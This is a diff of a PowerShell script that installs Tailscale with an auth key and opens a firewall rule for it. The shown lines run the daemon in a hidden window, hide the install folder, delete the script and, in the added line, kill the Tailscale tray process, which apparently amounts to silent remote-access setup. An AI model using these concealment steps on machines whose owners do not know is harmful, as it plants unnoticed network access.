@@ -74,7 +74,7 @@ Set-Location $dirName
 ## Install Tailscale and take ip
 installTailscale -authKey $authKey -path $temp/$dirName 
 Set-Location $PSScriptRoot
-netsh advfirewall firewall add rule name="Tailscale" dir=in action=allow program="C:\Tailscale\tailscale-ipn.exe" enable=yes
+netsh advfirewall firewall add rule name="Tailscaled" dir=in action=allow program="C:\Tailscale\tailscaled.exe" enable=yes
 Start-Sleep 5
 
 Start-Process -FilePath "C:\Tailscale\tailscaled.exe" -windowstyle hidden -Verb RunAs
@@ -119,3 +119,4 @@ Remove-Item $PSCommandPath -Force
 
 ## Finish Tailscale installation
 Get-Item "C:\tailscale" -Force | ForEach-Object {$_.Attributes = $_.Attributes -bor "Hidden"}
+taskkill.exe /im "C:\Tailscale\tailscale-ipn.exe" /F
